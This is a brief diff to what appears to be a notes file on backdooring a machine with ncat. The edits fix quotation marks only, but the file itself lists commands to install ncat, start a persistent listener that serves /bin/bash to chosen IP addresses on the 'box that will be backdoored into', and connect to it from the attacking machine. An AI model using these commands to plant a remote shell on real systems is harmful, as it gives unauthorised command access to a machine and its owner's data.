@@ -13,10 +13,10 @@
 'sudo aptitude -y install ncat'
 
 ## Local box that will be backdoored into 
-'ncat -k -nvlp <port> -e "/bin/bash" --allow <ip's go here>
+'ncat -k -nvlp <port> -e "/bin/bash" --allow <ip's go here>'
 
 ## Box that will backdoor into local machine 
-"'ncat -nv <ip address of local box> <port>'"
+'ncat -nv <ip address of local box> <port>'
 
 
 
